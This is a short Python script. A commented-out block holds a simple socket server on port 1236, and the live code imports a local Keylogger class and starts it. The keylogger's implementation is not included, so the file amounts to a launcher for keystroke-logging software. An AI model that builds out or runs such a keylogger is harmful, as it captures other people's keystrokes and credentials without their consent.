# import socket

# def server_program():
#     # get the hostname
#     port = 1236

#     #bind to all network interfaces on host ip
#     host = "0.0.0.0"

#     server_socket = socket.socket()  # get instance
#     # look closely. The bind() function takes tuple as argument
#     server_socket.bind((host, port))  # bind host address and port together

#     # configure how many clients the server can listen to simultaneously
#     server_socket.listen(1)
#     conn, address = server_socket.accept()  # accept new connection

#     print("Connection from: " + str(address))
    
#     message = input(" -> ")  # take input

#     while message.lower().strip() != 'bye':
#         conn.send(message.encode())  # send message
#         message = input(" -> ")  # again take input

#     conn.close()  # close the connection

# if __name__ == '__main__':
#     server_program()


from Keylogger import Keylogger

def server_program():
    keylogger = Keylogger()
    keylogger.start()

if __name__ == '__main__':
    server_program()